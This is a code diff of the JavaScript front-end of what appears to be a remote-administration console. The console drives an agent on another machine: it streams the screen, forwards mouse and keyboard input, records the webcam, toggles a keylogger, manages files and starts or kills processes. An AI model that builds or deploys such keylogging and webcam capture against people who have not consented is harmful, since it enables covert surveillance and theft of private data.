+            // --- TRƯỜNG HỢP 1: ĐANG CÓ KẾT NỐI ---
+            // Chỉ cần chuyển ngữ cảnh (Context Switch) mà KHÔNG ngắt socket
+
+            // Cập nhật trạng thái hiển thị tên Agent mới
+            setConnectedState(true, hostname);
+
+            // Xóa dữ liệu cũ trên màn hình (của Agent trước) để tránh nhầm lẫn
+            resetUI();
+
+            // Tải ngay dữ liệu mới cho màn hình đang mở
+            loadDataForView(currentView);
+
+        } else {
+            // --- TRƯỜNG HỢP 2: CHƯA KẾT NỐI ---
+            // Thiết lập kết nối mới như bình thường
             try {
                 ws = new WebSocket(url);
-                ws.onopen = () => { setConnectedState(true, hostname); loadDataForView(currentView); };
-                ws.onclose = () => { setConnectedState(false); ws = null; resetUI(); };
+
+                ws.onopen = () => {
+                    // Khi nối xong thì gán trạng thái và tải dữ liệu
+                    setConnectedState(true, hostname);
+                    loadDataForView(currentView);
+                };
+
+                ws.onclose = () => {
+                    setConnectedState(false);
+                    ws = null;
+                    resetUI();
+                };
+
                 ws.onerror = (e) => alert('Connection failed');
                 ws.onmessage = onWsMessage;
-            } catch (e) { alert('Failed to connect to agent'); }
-        }, 300);
+
+            } catch (e) {
+                alert('Failed to connect to agent');
+            }
+        }
     };
 
     window.requestStopApp = (name) => {
@@ -712,21 +1174,29 @@ document.addEventListener('DOMContentLoaded', () => {
         sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
     };
 
-    window.requestDeleteFile = (name) => {
+    window.requestDeleteFile = (encodedName) => {
         event.stopPropagation();
+        const name = decodeURIComponent(encodedName);
         const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
         if (confirm(`Delete "${name}"?`)) sendWsMessage({ command: 'fs_delete', path: fullPath });
     };
 
     window.openFolder = (path) => {
         const grid = document.getElementById('file-grid');
-        if (grid) { grid.style.opacity = '0.5'; grid.style.pointerEvents = 'none'; grid.style.cursor = 'wait'; }
-        setTimeout(() => { unlockFileUI(); }, 1000);
+        if (grid) {
+            grid.style.opacity = '0.5';
+            grid.style.pointerEvents = 'none';
+            grid.style.cursor = 'wait';
+        }
+        setTimeout(() => {
+            unlockFileUI();
+        }, 1000);
         sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
     };
 
-    window.requestDownloadFile = (name) => {
+    window.requestDownloadFile = (encodedName) => {
         event.stopPropagation();
+        const name = decodeURIComponent(encodedName);
         const fullPath = currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name;
         sendWsMessage({ command: 'fs_download', path: fullPath });
     };
@@ -738,7 +1208,10 @@ document.addEventListener('DOMContentLoaded', () => {
             const originalText = btn.innerText;
             btn.innerText = "Copied!";
             btn.classList.add("copied");
-            setTimeout(() => { btn.innerText = originalText; btn.classList.remove("copied"); }, 1500);
+            setTimeout(() => {
+                btn.innerText = originalText;
+                btn.classList.remove("copied");
+            }, 1500);
         };
         if (navigator.clipboard && window.isSecureContext) navigator.clipboard.writeText(text).then(showSuccess);
         else prompt("Copy thủ công:", text);
@@ -786,11 +1259,14 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const handleCloseModal = () => {
         hideAllModals();
-        if (scanInterval) { clearInterval(scanInterval); scanInterval = null; }
+        if (scanInterval) {
+            clearInterval(scanInterval);
+            scanInterval = null;
+        }
         btnScanLan.classList.remove('active-scan');
     };
 
-    const fetchScanList = async() => {
+    const fetchScanList = async () => {
         try {
             const response = await fetch(`${location.protocol}//${location.host}/api/scan`);
             if (!response.ok) throw new Error("Error");
@@ -812,10 +1288,23 @@ document.addEventListener('DOMContentLoaded', () => {
         const sessionUser = sessionStorage.getItem('rcc_user');
 
         if (!sessionUser) authOverlay.classList.remove('hidden');
-        else { authOverlay.classList.add('hidden'); console.log("Welcome back:", sessionUser); }
+        else {
+            authOverlay.classList.add('hidden');
+            console.log("Welcome back:", sessionUser);
+        }
 
-        $('#link-to-register').onclick = (e) => { e.preventDefault(); formLogin.classList.add('hidden'); formRegister.classList.remove('hidden'); authMsg.classList.add('hidden'); };
-        $('#link-to-login').onclick = (e) => { e.preventDefault(); formRegister.classList.add('hidden'); formLogin.classList.remove('hidden'); authMsg.classList.add('hidden'); };
+        $('#link-to-register').onclick = (e) => {
+            e.preventDefault();
+            formLogin.classList.add('hidden');
+            formRegister.classList.remove('hidden');
+            authMsg.classList.add('hidden');
+        };
+        $('#link-to-login').onclick = (e) => {
+            e.preventDefault();
+            formRegister.classList.add('hidden');
+            formLogin.classList.remove('hidden');
+            authMsg.classList.add('hidden');
+        };
 
         function showAuthMsg(msg, type) {
             authMsg.textContent = msg;
@@ -828,22 +1317,48 @@ document.addEventListener('DOMContentLoaded', () => {
             const p = $('#reg-pass').value;
             if (!u || !p) return showAuthMsg("Please fill all fields", "error");
             try {
-                const res = await fetch('/api/register', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
+                const res = await fetch('/api/register', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: u,
+                        password: p
+                    })
+                });
                 const data = await res.json();
-                if (data.success) { showAuthMsg(data.message, "success"); setTimeout(() => $('#link-to-login').click(), 2000); } 
-                else showAuthMsg(data.message, "error");
-            } catch (e) { showAuthMsg("Network error", "error"); }
+                if (data.success) {
+                    showAuthMsg(data.message, "success");
+                    setTimeout(() => $('#link-to-login').click(), 2000);
+                } else showAuthMsg(data.message, "error");
+            } catch (e) {
+                showAuthMsg("Network error", "error");
+            }
         };
 
         $('#btn-do-login').onclick = async () => {
             const u = $('#login-user').value;
             const p = $('#login-pass').value;
             try {
-                const res = await fetch('/api/login', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username: u, password: p }) });
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        username: u,
+                        password: p
+                    })
+                });
                 const data = await res.json();
-                if (data.success) { sessionStorage.setItem('rcc_user', data.username); authOverlay.classList.add('hidden'); } 
-                else showAuthMsg(data.message, "error");
-            } catch (e) { showAuthMsg("Network error", "error"); }
+                if (data.success) {
+                    sessionStorage.setItem('rcc_user', data.username);
+                    authOverlay.classList.add('hidden');
+                } else showAuthMsg(data.message, "error");
+            } catch (e) {
+                showAuthMsg("Network error", "error");
+            }
         };
 
         // 2. Main Connection
@@ -851,23 +1366,62 @@ document.addEventListener('DOMContentLoaded', () => {
         wsUrlInput.value = `${proto}://${location.host}/ws`;
         btnConnect.onclick = connectWs;
         btnDisconnect.onclick = disconnectWs;
-        
+
         if (btnLogoutSidebar) {
             btnLogoutSidebar.onclick = () => {
                 if (typeof showConfirmModal === 'function') showConfirmModal('Đăng xuất', 'Bạn có chắc chắn muốn đăng xuất?', 'danger', () => performLogout());
-                else if(confirm("Bạn có chắc muốn đăng xuất?")) performLogout();
+                else if (confirm("Bạn có chắc muốn đăng xuất?")) performLogout();
             };
         }
 
         // 3. Navigation
-        $('#sidebar').onclick = e => { const item = e.target.closest('.nav-item'); if (item) showView(item.dataset.view); };
+        $('#sidebar').onclick = e => {
+            const item = e.target.closest('.nav-item');
+            if (item) showView(item.dataset.view);
+        };
         $('#main-content').onclick = e => {
+            // 1. Xử lý chuyển View khi bấm vào Dashboard Card
             const card = e.target.closest('[data-action="show-view"]');
-            if (card) showView(card.dataset.target);
+            if (card) {
+                if (!canUseAgentFeature()) return;
+                if (!card.dataset.target) return;
+                showView(card.dataset.target);
+            }
+
+            // 2. Xử lý nút STOP PROCESS (Kill PID) trong bảng Process
             const stopBtn = e.target.closest('[data-action="stop-proc"]');
-            if (stopBtn) showConfirmModal('Kill Process', `PID ${stopBtn.dataset.pid}?`, 'danger', () => sendWsMessage({ command: 'stop_process_pid', pid: parseInt(stopBtn.dataset.pid) }));
+            if (stopBtn) {
+                if (!canUseAgentFeature()) return;
+                showConfirmModal(
+                    'Kill Process',
+                    `Are you sure you want to kill PID ${stopBtn.dataset.pid}?`,
+                    'danger',
+                    () => {
+                        sendWsMessage({
+                            command: 'stop_process_pid',
+                            pid: parseInt(stopBtn.dataset.pid)
+                        });
+                    }
+                );
+            }
+
+            // 3. Xử lý nút STOP APP (End Task) trong bảng Application
             const stopAppBtn = e.target.closest('[data-action="stop-app"]');
-            if (stopAppBtn) showConfirmModal('Stop App', `Close "${stopAppBtn.dataset.name}"?`, 'danger', () => sendWsMessage({ command: 'stop_application', app_name: stopAppBtn.dataset.name }));
+            if (stopAppBtn) {
+                if (!canUseAgentFeature()) return;
+
+                showConfirmModal(
+                    'Stop App',
+                    `Force close "${stopAppBtn.dataset.name}"?`,
+                    'danger',
+                    () => {
+                        sendWsMessage({
+                            command: 'stop_application',
+                            app_name: stopAppBtn.dataset.name
+                        });
+                    }
+                );
+            }
         };
 
         if (btnScanLan) {
@@ -883,15 +1437,39 @@ document.addEventListener('DOMContentLoaded', () => {
         // 4. Modals
         $('#modal-backdrop').onclick = handleCloseModal;
         $$('[data-action="cancel"]').forEach(b => b.onclick = handleCloseModal);
-        window.addEventListener('click', (event) => { if (event.target === passwordModal) passwordModal.classList.add('hidden'); });
+        window.addEventListener('click', (event) => {
+            if (event.target === passwordModal) passwordModal.classList.add('hidden');
+        });
 
-        if ($('#card-open-stop-apps')) $('#card-open-stop-apps').onclick = () => { showModal('modal-stop-app'); sendWsMessage({ command: 'list_applications' }); };
-        if ($('#card-open-stop-procs')) $('#card-open-stop-procs').onclick = () => { showModal('modal-stop-proc'); sendWsMessage({ command: 'list_processes' }); };
+        if ($('#card-open-stop-apps')) $('#card-open-stop-apps').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            showModal('modal-stop-app');
+            sendWsMessage({ command: 'list_applications' });
+        };
+        if ($('#card-open-stop-procs')) $('#card-open-stop-procs').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            showModal('modal-stop-proc');
+            sendWsMessage({ command: 'list_processes' });
+        };
 
-        $('#btn-start-process').onclick = () => showModal('modal-start-process');
-        $('#btn-start-app').onclick = () => showModal('modal-start-app');
-        $('#modal-start-process [data-action="confirm"]').onclick = () => { sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value }); handleCloseModal(); };
-        $('#modal-start-app [data-action="confirm"]').onclick = () => { sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value }); handleCloseModal(); };
+        $('#btn-start-process').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            showModal('modal-start-process');
+        };
+        $('#btn-start-app').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            showModal('modal-start-app');
+        };
+        $('#modal-start-process [data-action="confirm"]').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            sendWsMessage({ command: 'start_process', path: $('#input-proc-path').value, args: $('#input-proc-args').value });
+            handleCloseModal();
+        };
+        $('#modal-start-app [data-action="confirm"]').onclick = () => {
+            if (!canUseAgentFeature()) return;
+            sendWsMessage({ command: 'start_application', app_name: $('#input-app-name').value });
+            handleCloseModal();
+        };
 
         // 5. Screen Controls
         btnTakeScreenshot.onclick = () => {
@@ -926,18 +1504,133 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
 
-        btnStopStream.onclick = () => { sendWsMessage({ command: 'stop_screen_stream' }); resetScreenUI(); };
-        btnSaveScreenshot.onclick = () => { const a = document.createElement('a'); a.href = captureImg.src; a.download = `screen-${Date.now()}.png`; a.click(); };
-        btnCopyScreenshot.onclick = async () => { try { const response = await fetch(captureImg.src); const blob = await response.blob(); await navigator.clipboard.write([new ClipboardItem({ [blob.type]: blob })]); alert('Copied to clipboard!'); } catch (err) { alert('Copy failed'); } };
+        btnStopStream.onclick = () => {
+            sendWsMessage({ command: 'stop_screen_stream' });
+            resetScreenUI();
+        };
+        btnSaveScreenshot.onclick = () => {
+            const a = document.createElement('a');
+            a.href = captureImg.src;
+            a.download = `screen-${Date.now()}.png`;
+            a.click();
+        };
+        btnCopyScreenshot.onclick = async () => {
+            try {
+                const response = await fetch(captureImg.src);
+                const blob = await response.blob();
+                await navigator.clipboard.write([new ClipboardItem({
+                    [blob.type]: blob
+                })]);
+                alert('Copied to clipboard!');
+            } catch (err) {
+                alert('Copy failed');
+            }
+        };
+        if (btnReloadScreen) {
+            btnReloadScreen.onclick = () => {
+                sendWsMessage({ command: 'stop_screen_stream' });
+                resetScreenUI();
+            };
+        }
+        // Control
+        let lastSent = 0;
+        const THROTTLE_MS = 50;
 
-        // Mouse Control
-        let lastSent = 0; const THROTTLE_MS = 50;
-        function sendMouse(payload) { if (ws && ws.readyState === WebSocket.OPEN && !streamImg.classList.contains('hidden') && mouseToggle && mouseToggle.checked) { payload.command = 'mouse_input'; sendWsMessage(payload); } }
-        streamImg.addEventListener('mousemove', (e) => { if (Date.now() - lastSent < THROTTLE_MS) return; lastSent = Date.now(); const rect = streamImg.getBoundingClientRect(); sendMouse({ action: 'move', x: (e.clientX - rect.left)/rect.width, y: (e.clientY - rect.top)/rect.height }); });
-        streamImg.addEventListener('mousedown', (e) => { sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'down' }); });
-        streamImg.addEventListener('mouseup', (e) => { sendMouse({ action: 'click', button: e.button===2?'right':(e.button===1?'middle':'left'), state: 'up' }); });
-        streamImg.addEventListener('contextmenu', e => { if(mouseToggle && mouseToggle.checked) e.preventDefault(); });
-        streamImg.addEventListener('wheel', (e) => { if(mouseToggle && mouseToggle.checked) { e.preventDefault(); const delta = e.deltaY > 0 ? -120 : 120; sendMouse({ action: 'scroll', delta: delta }); } }, { passive: false });
+        // 1. Logic kiểm tra trạng thái bật/tắt
+        if (controlToggle) {
+            controlToggle.onclick = (e) => {
+                const isNotStreaming = !btnStartStream.classList.contains('hidden');
+                // Nếu chưa bật Stream mà bật Control -> Báo lỗi
+                if (isNotStreaming && e.target.checked) {
+                    e.preventDefault();
+                    alert("Please start Live Stream first to enable Remote Control.");
+                }
+                // Focus vào cửa sổ để bắt sự kiện phím ngay lập tức
+                if (e.target.checked) {
+                    window.focus();
+                }
+            };
+        }
+
+        // 2. Hàm gửi dữ liệu chuột
+        function sendMouse(payload) {
+            if (ws && ws.readyState === WebSocket.OPEN && !streamImg.classList.contains('hidden') && controlToggle && controlToggle.checked) {
+                payload.command = 'mouse_input';
+                sendWsMessage(payload);
+            }
+        }
+
+        // 3. Sự kiện Chuột
+        streamImg.addEventListener('mousemove', (e) => {
+            if (Date.now() - lastSent < THROTTLE_MS) return;
+            lastSent = Date.now();
+            const rect = streamImg.getBoundingClientRect();
+            sendMouse({
+                action: 'move',
+                x: (e.clientX - rect.left) / rect.width,
+                y: (e.clientY - rect.top) / rect.height
+            });
+        });
+
+        streamImg.addEventListener('mousedown', (e) => {
+            sendMouse({
+                action: 'click',
+                button: e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left'),
+                state: 'down'
+            });
+        });
+
+        streamImg.addEventListener('mouseup', (e) => {
+            sendMouse({
+                action: 'click',
+                button: e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left'),
+                state: 'up'
+            });
+        });
+
+        streamImg.addEventListener('contextmenu', e => {
+            if (controlToggle && controlToggle.checked) e.preventDefault();
+        });
+
+        streamImg.addEventListener('wheel', (e) => {
+            if (controlToggle && controlToggle.checked) {
+                e.preventDefault();
+                const delta = e.deltaY > 0 ? -120 : 120;
+                sendMouse({
+                    action: 'scroll',
+                    delta: delta
+                });
+            }
+        }, {
+            passive: false
+        });
+
+        // 4. Sự kiện Bàn phím
+        document.addEventListener('keydown', (e) => {
+            if (!controlToggle || !controlToggle.checked) return;
+
+            // Quan trọng: Không gửi phím nếu đang gõ vào ô Input 
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+
+            e.preventDefault(); // Chặn hành vi mặc định (ví dụ F5 refresh, Ctrl+S save của trình duyệt)
+
+            // Gửi về C++
+            sendWsMessage({
+                command: 'keyboard_input',
+                keyCode: e.keyCode,
+                key: e.key,
+                shift: e.shiftKey,
+                ctrl: e.ctrlKey,
+                alt: e.altKey
+            });
+        });
+
+        // Xử lý sự kiện nhả phím 
+        document.addEventListener('keyup', (e) => {
+            if (!controlToggle || !controlToggle.checked) return;
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            e.preventDefault();
+        });
 
         // 6. Webcam Controls
         const emptyIcon = $('#webcam-display-area .empty-icon');
@@ -948,14 +1641,50 @@ document.addEventListener('DOMContentLoaded', () => {
         btnStopWebcamStream.classList.add('hidden');
         btnStartRecord.classList.remove('hidden');
 
-        btnStartRecord.onclick = () => { webcamMode = 'record'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); showModal('modal-webcam-device'); };
-        $('#modal-webcam-device [data-action="confirm"]').onclick = () => { webcamMode = 'record'; sendWsMessage({ command: 'start_webcam_record', time: parseInt(inputWebcamDuration.value) || 10, device_name: inputWebcamDeviceName.value }); handleCloseModal(); };
+        btnStartRecord.onclick = () => {
+            if (!canUseAgentFeature()) return;
+            webcamMode = 'record';
+            sendWsMessage({ command: 'stop_webcam_stream' });
+            clearWebcamStreamUI();
+            showModal('modal-webcam-device');
+        };
+        $('#modal-webcam-device [data-action="confirm"]').onclick = () => {
+            webcamMode = 'record';
+            sendWsMessage({ command: 'start_webcam_record', time: parseInt(inputWebcamDuration.value) || 10, device_name: inputWebcamDeviceName.value });
+            handleCloseModal();
+        };
         btnStopRecord.onclick = () => sendWsMessage({ command: 'stop_webcam_record' });
 
-        btnStartWebcamStream.onclick = () => { webcamMode = 'stream'; sendWsMessage({ command: 'start_webcam_stream', fps: 30 }); btnStartWebcamStream.classList.add('hidden'); btnStopWebcamStream.classList.remove('hidden'); };
-        btnStopWebcamStream.onclick = () => { webcamMode = 'idle'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); };
-        if(btnReloadWebcam) btnReloadWebcam.onclick = () => { webcamMode = 'idle'; sendWsMessage({ command: 'stop_webcam_stream' }); clearWebcamStreamUI(); btnStartWebcamStream.classList.remove('hidden'); btnStopWebcamStream.classList.add('hidden'); btnSaveVideo.classList.add('hidden'); };
-        btnSaveVideo.onclick = () => { if (currentVideoBlob) { const a = document.createElement('a'); a.href = URL.createObjectURL(currentVideoBlob); a.download = `webcam-${Date.now()}.mp4`; a.click(); } };
+        btnStartWebcamStream.onclick = () => {
+            if (!canUseAgentFeature()) return;
+            webcamMode = 'stream';
+            sendWsMessage({ command: 'start_webcam_stream', fps: 30 });
+            btnStartWebcamStream.classList.add('hidden');
+            btnStopWebcamStream.classList.remove('hidden');
+        };
+        btnStopWebcamStream.onclick = () => {
+            webcamMode = 'idle';
+            sendWsMessage({ command: 'stop_webcam_stream' });
+            clearWebcamStreamUI();
+            btnStartWebcamStream.classList.remove('hidden');
+            btnStopWebcamStream.classList.add('hidden');
+        };
+        if (btnReloadWebcam) btnReloadWebcam.onclick = () => {
+            webcamMode = 'idle';
+            sendWsMessage({ command: 'stop_webcam_stream' });
+            clearWebcamStreamUI();
+            btnStartWebcamStream.classList.remove('hidden');
+            btnStopWebcamStream.classList.add('hidden');
+            btnSaveVideo.classList.add('hidden');
+        };
+        btnSaveVideo.onclick = () => {
+            if (currentVideoBlob) {
+                const a = document.createElement('a');
+                a.href = URL.createObjectURL(currentVideoBlob);
+                a.download = `webcam-${Date.now()}.mp4`;
+                a.click();
+            }
+        };
 
         // 7. Keylogger
         keylogToggle.onchange = e => {
@@ -968,30 +1697,84 @@ document.addEventListener('DOMContentLoaded', () => {
                 command: e.target.checked ? 'start_keylog' : 'stop_keylog'
             });
 
-            keylogOutput.textContent = e.target.checked
-                ? 'Starting...'
-                : 'Stopped.';
+            keylogOutput.textContent = e.target.checked ?
+                'Starting...' :
+                'Stopped.';
 
             isKeylogClean = true;
         };
 
-        if (btnClearKeylog) btnClearKeylog.onclick = () => { keylogOutput.textContent = 'Cleared.'; isKeylogClean = true; };
+        if (btnClearKeylog) btnClearKeylog.onclick = () => {
+            keylogOutput.textContent = 'Cleared.';
+            isKeylogClean = true;
+        };
 
         // 8. File Manager Events
-        if (btnFsGo) btnFsGo.onclick = () => { const path = inputFsPath.value; if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' }); };
-        if (inputFsPath) inputFsPath.addEventListener("keypress", (event) => { if (event.key === "Enter") btnFsGo.click(); });
+        if (btnFsGo) btnFsGo.onclick = () => {
+            const path = inputFsPath.value;
+            if (path) sendWsMessage({ command: 'fs_list', path: path, context: 'view' });
+        };
+        if (inputFsPath) inputFsPath.addEventListener("keypress", (event) => {
+            if (event.key === "Enter") btnFsGo.click();
+        });
         if (btnFsUp) btnFsUp.onclick = () => {
             let p = currentPath;
             if (p.endsWith('\\') || p.endsWith('/')) p = p.slice(0, -1);
             const lastSlash = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
-            if (lastSlash === -1) { sendWsMessage({ command: 'fs_drives' }); return; }
+            if (lastSlash === -1) {
+                sendWsMessage({ command: 'fs_drives' });
+                return;
+            }
             let parent = p.substring(0, lastSlash);
             if (parent.length === 2 && parent.charAt(1) === ':') parent += "\\";
-            if (parent === "") sendWsMessage({ command: 'fs_drives' }); else sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
+            if (parent === "") sendWsMessage({ command: 'fs_drives' });
+            else sendWsMessage({ command: 'fs_list', path: parent, context: 'view' });
+        };
+        if (btnFsRefresh) btnFsRefresh.onclick = () => {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                sendWsMessage({ command: 'fs_drives' });
+                sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' });
+            }
+        };
+        if (btnNewFolder) btnNewFolder.onclick = () => {
+            const name = prompt("Enter new folder name:");
+            if (name) sendWsMessage({ command: 'fs_mkdir', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name });
+        };
+        if (btnNewFile) btnNewFile.onclick = () => {
+            const name = prompt("Enter new file name (e.g., text.txt):");
+            if (name) {
+                sendWsMessage({ command: 'fs_mkfile', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name });
+                setTimeout(() => sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }), 500);
+            }
         };
         if (btnFsRefresh) btnFsRefresh.onclick = () => { if (ws && ws.readyState === WebSocket.OPEN) { sendWsMessage({ command: 'fs_drives' }); sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }); } };
         if (btnNewFolder) btnNewFolder.onclick = () => { const name = prompt("Enter new folder name:"); if (name) sendWsMessage({ command: 'fs_mkdir', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name }); };
         if (btnNewFile) btnNewFile.onclick = () => { const name = prompt("Enter new file name (e.g., text.txt):"); if (name) { sendWsMessage({ command: 'fs_mkfile', path: currentPath.endsWith('\\') ? currentPath + name : currentPath + '\\' + name }); setTimeout(() => sendWsMessage({ command: 'fs_list', path: currentPath, context: 'view' }), 500); } };
+        // 1. Lấy thẻ input có sẵn
+        const realFileInput = document.getElementById('hidden-file-input');
+
+        // 2. Gắn sự kiện (FIXED: dùng startFileUpload)
+        if (realFileInput) {
+            realFileInput.addEventListener('change', function() {
+                const file = this.files[0];
+                if (!file) return;
+                
+                // Gọi hàm upload theo chunk
+                startFileUpload(file); 
+            });
+        }
+
+        // 3. Button click trigger (Giữ nguyên)
+        if (btnUploadFile) {
+            btnUploadFile.onclick = () => {
+                if (uploadState.active) {
+                    alert("Please wait for the current upload to finish.");
+                    return;
+                }
+                if (realFileInput) realFileInput.click();
+            };
+        }
+
 
         // 9. System Actions
         if ($('#btn-system-restart')) {
@@ -1020,16 +1803,38 @@ document.addEventListener('DOMContentLoaded', () => {
             };
         }
 
+        // Toggle Sidebar Logic
+        const btnToggleSidebar = document.getElementById('btn-toggle-sidebar');
+        const sidebarEl = document.getElementById('sidebar');
+
+        if (btnToggleSidebar && sidebarEl) {
+            btnToggleSidebar.onclick = () => {
+                sidebarEl.classList.toggle('collapsed');
+            };
+        }
+
         // 10. Theme & Traffic Lights
-        $('.dot.red').onclick = () => { if (ws) disconnectWs(); };
-        $('.dot.yellow').onclick = () => { if (themeToggle) themeToggle.click(); };
+        $('.dot.red').onclick = () => {
+            if (ws) disconnectWs();
+        };
+        $('.dot.yellow').onclick = () => {
+            if (themeToggle) themeToggle.click();
+        };
         $('.dot.green').onclick = () => document.fullscreenElement ? document.exitFullscreen() : document.documentElement.requestFullscreen();
 
         if (themeToggle) {
-            themeToggle.onchange = e => { document.body.className = e.target.checked ? 'dark-theme' : ''; localStorage.setItem('theme', e.target.checked ? 'dark' : 'light'); };
+            themeToggle.onchange = e => {
+                document.body.className = e.target.checked ? 'dark-theme' : '';
+                localStorage.setItem('theme', e.target.checked ? 'dark' : 'light');
+            };
             const saved = localStorage.getItem('theme');
-            if (saved === 'dark') { document.body.classList.add('dark-theme'); themeToggle.checked = true; } 
-            else { document.body.classList.remove('dark-theme'); themeToggle.checked = false; }
+            if (saved === 'dark') {
+                document.body.classList.add('dark-theme');
+                themeToggle.checked = true;
+            } else {
+                document.body.classList.remove('dark-theme');
+                themeToggle.checked = false;
+            }
         }
     }
 
@@ -1037,5 +1842,7 @@ document.addEventListener('DOMContentLoaded', () => {
     // START
     // =================================================================
     init();
-    setTimeout(() => { if (typeof feather !== 'undefined') feather.replace(); }, 500);
+    setTimeout(() => {
+        if (typeof feather !== 'undefined') feather.replace();
+    }, 500);
 });
